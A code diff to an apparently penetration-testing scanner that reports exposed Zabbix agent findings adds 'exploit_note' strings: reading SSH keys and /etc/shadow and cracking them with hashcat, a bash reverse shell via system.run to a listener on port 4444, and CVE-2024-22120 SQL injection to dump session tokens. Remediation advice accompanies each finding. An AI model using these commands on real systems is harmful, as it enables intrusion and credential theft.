@@ -299,10 +299,12 @@ def zabbix_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "zabbix_get", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -333,7 +335,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "zabbix_agentd.conf and restart the agent. Never leave 0.0.0.0/0 "
                     "or a broad public range.",
                     ["CWE-284", "CWE-306"],
-                    kind="zabbix_agent_allowlist_bypass"))
+                    kind="zabbix_agent_allowlist_bypass",
+                    exploit_note=(
+                        "zabbix_get -s <ip> -p 10050 -k agent.version — "
+                        "confirm; then walk the inventory/file-read/RCE probes "
+                        "below."),
+                    depth_tier="t1"))
 
                 inv = pr.get("inventory") or {}
                 if inv:
@@ -350,7 +357,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         f"zabbix_get -s {h.ip} -p {p.portid} -k system.uname",
                         "Restrict item keys with AllowKey/DenyKey; combine with a strict "
                         "Server= allow-list.",
-                        ["CWE-200"], kind="zabbix_agent_inventory_disclosure"))
+                        ["CWE-200"], kind="zabbix_agent_inventory_disclosure",
+                        exploit_note=(
+                            "for k in system.hostname system.uname "
+                            "net.tcp.listen system.users.num; do zabbix_get "
+                            "-s <ip> -p 10050 -k $k; done — parse "
+                            "net.tcp.listen JSON for internal-only ports."),
+                        depth_tier="t2"))
 
                 files = pr.get("files") or {}
                 if files:
@@ -377,7 +390,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "Set AllowKey/DenyKey in zabbix_agentd.conf to deny "
                         "vfs.file.contents entirely, or restrict to a well-known safe "
                         "path. Run the agent as a non-privileged user (never root).",
-                        ["CWE-200", "CWE-552"], kind="zabbix_agent_file_read"))
+                        ["CWE-200", "CWE-552"], kind="zabbix_agent_file_read",
+                        exploit_note=(
+                            "zabbix_get -s <ip> -p 10050 -k "
+                            "'vfs.file.contents[/root/.ssh/id_rsa]'; -k "
+                            "'vfs.file.contents[/etc/shadow]'; feed hashes to "
+                            "hashcat -m 1800 rockyou.txt."),
+                        depth_tier="t2"))
 
                 if pr.get("remote_commands"):
                     out.append(_finding(
@@ -392,7 +411,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "Set EnableRemoteCommands=0 in zabbix_agentd.conf and remove any "
                         "AllowKey=system.run[*]. Restart the agent. Prefer Zabbix agent 2 "
                         "with explicit plugin allowance for command execution.",
-                        ["CWE-78", "CWE-306"], kind="zabbix_agent_rce"))
+                        ["CWE-78", "CWE-306"], kind="zabbix_agent_rce",
+                        exploit_note=(
+                            "zabbix_get -s <ip> -p 10050 -k 'system.run[bash "
+                            "-i >& /dev/tcp/<listener>/4444 0>&1]' — with "
+                            "`nc -lnvp 4444` waiting. Also fetch ~/.ssh/id_rsa "
+                            "and /root/.ssh/authorized_keys via "
+                            "system.run[cat] once as root."),
+                        depth_tier="t2"))
 
                 if pr.get("server_ips"):
                     out.append(_finding(
@@ -426,7 +452,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "(TLSAccept=cert|psk in zabbix_server.conf). Gate/disable "
                         "auto-registration actions that match arbitrary HostMetadata. "
                         "Upgrade to the current LTS to close CVE-2024-22120.",
-                        ["CWE-306", "CWE-89"], kind="zabbix_autoreg_accepted"))
+                        ["CWE-306", "CWE-89"], kind="zabbix_autoreg_accepted",
+                        exploit_note=(
+                            "Send active-checks with host_metadata containing "
+                            "the CVE-2024-22120 SQLi payload (see "
+                            "zabbix-2024-22120 PoC gist); confirm DB write via "
+                            "a benign UPDATE on auditlog. Then dump users "
+                            "table for zabbix session tokens / password hashes."),
+                        depth_tier="t2"))
                 if pr.get("tls_required"):
                     out.append(_finding(
                         "info", "Zabbix trapper enforces TLS PSK / certificate", tgt,
